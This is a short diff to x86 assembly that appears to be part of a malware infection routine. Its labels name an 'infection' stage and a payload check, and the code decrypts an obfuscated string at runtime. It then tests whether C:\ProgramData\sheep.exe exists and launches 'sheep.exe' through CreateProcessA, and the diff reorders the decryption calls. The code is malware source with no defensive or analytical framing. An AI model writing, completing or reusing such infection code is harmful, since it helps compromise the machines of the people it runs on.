@@ -102,10 +102,10 @@ infection__alloc_powershell_aligned:
    mov dword [ebp-0x58],0x44
 
    lea eax, [ebx+(infection__data__sheep-infection__data__start)] ; pointer to encrypted struct
+   push dword [ebp-8]
    push eax
    call decrypt_string
-   lea eax, [ebx+(infection__data__sheep-infection__data__start)+5] ; C:\ProgramData\sheep.exe
-   push eax
+   push dword [ebp-0xC]
    call esi                                                       ; GetFileAttributesA("C:\\ProgramData\\sheep.exe")
    cmp eax, 0xFFFFFFFF          ; eax != INVALID_FILE_ATTRIBUTES
    jnz infection__payload_exists
@@ -155,10 +155,6 @@ infection__payload_exists:
    push 0
    push 0
    push 0
-   lea eax, [ebx+(infection__data__sheep-infection__data__start)]
-   push dword [ebp-8]
-   push eax
-   call decrypt_string
    push dword [ebp-8]
    push 0
    call [ebp-4]                     ; CreateProcessA(NULL, "sheep.exe", NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &proc_info)
